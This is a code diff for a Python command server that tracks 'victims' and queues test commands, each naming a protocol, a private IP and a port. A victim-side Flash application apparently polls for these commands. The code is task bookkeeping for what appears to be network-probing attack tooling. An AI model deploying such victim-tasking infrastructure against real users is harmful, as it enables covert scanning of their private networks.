@@ -22,6 +22,45 @@ class Victim():
 		self.LAST_SEEN = datetime.now()	
 		if tests != None: 
 			self.TESTS=tests
+	def addTest(self,proto, private_ip, private_port):
+		global TESTS
+		loTest = self.Test(proto,self.PUBLIC_IP, private_ip,private_port)
+		self.TESTS.append(loTest)
+	def _reload(self):
+		self.TESTS.append(self.Test("RELOAD","","",""))
+	class Test():
+		TEST_ID= ""
+		PUBLIC_IP = ""
+		PRIVATE_IP=""
+		PRIVATE_PORT=""
+		PUBLIC_PORT=""
+		TEST_TYPE=""
+		RESULT=False
+		STATUS="" #NEW, INPROGRESS or DONE
+		def __init__(self,test_type, public_ip,private_ip,private_port):
+			global TEST_ID, TEST_TYPE, PUBLIC_IP, PRIVATE_IP, PRIVATE_PORT, PUBLIC_PORT, TEST_TYPE, RESULT, STATUS
+			self.TEST_TYPE=test_type			
+			self.PUBLIC_IP=public_ip
+			self.PRIVATE_IP=private_ip
+			self.PRIVATE_PORT = private_port
+			self.PUBLIC_PORT = "0"
+			self.RESULT=False
+			self.TEST_ID = self.createTestId()
+			self.STATUS= "NEW"
+		def createTestId(self):
+			testid = str(datetime.now())
+			testid = testid.replace("-","")
+			testid = testid.replace(":","")
+			testid = testid.replace(" ","")
+			testid = testid.replace(".","")
+			return testid
+		def getTestString(self):
+			#this is the command format as expected by the flash application
+			if self.TEST_TYPE =="RELOAD":
+				return "RELOAD"
+			else:
+				return "TEST " + self.TEST_TYPE + " " +  self.PRIVATE_IP + " " + self.PRIVATE_PORT + " " + self.TEST_ID
+#end class
 #end class
 class CMDProtoHandler(asyncore.dispatcher_with_send):
 	VICTIMS = []
@@ -55,11 +94,12 @@ class CMDProtoHandler(asyncore.dispatcher_with_send):
 		elif parts[0]=="POLL":
 			#self.server.log("POLLING request from " + parts[1], 1)
 			test = self.getVicTest(request)
-			self.send(test + "\n")
-			if len(parts)==2:
+			if test != None:
+				self.send(test.getTestString() + "\n")
+				test.STATUS="INPROGRESS"
 				for vic in self.VICTIMS:
 					if vic.VIC_ID == parts[1]:
-						if test <> "NONE": self.server.log(vic.VIC_ID + " : send " + test,0)
+						self.server.log(vic.VIC_ID + " : send " + test.TEST_ID,0)
 						vic.LAST_SEEN = datetime.now()
 						break
 		elif parts[0]=="ERROR":
@@ -68,21 +108,17 @@ class CMDProtoHandler(asyncore.dispatcher_with_send):
 			self.server.log("Invallid command.",0)
 	def getVicTest(self,cmd):
 		global VICTIMS
-		test = ""
+		test = None
 		pollreq = cmd.split(" ")
 		if len(pollreq) != 2:
 			self.server.log("Invallid POLL request: " + cmd, 0)
 		else:
 			for vic in self.VICTIMS:
 				if vic.VIC_ID == pollreq[1]:
-					if len(vic.TESTS)==0:
-						test = "NONE"
-					else:
-						test = vic.TESTS[0]
-						vic.TESTS = vic.TESTS[1:]
-						if test<> "RELOAD":
-							test = "TEST " + test
-					break
+					for xtest in vic.TESTS:
+						if xtest.STATUS=="NEW":
+							test = xtest
+							break
 		return test
 	#end def		
 #end class
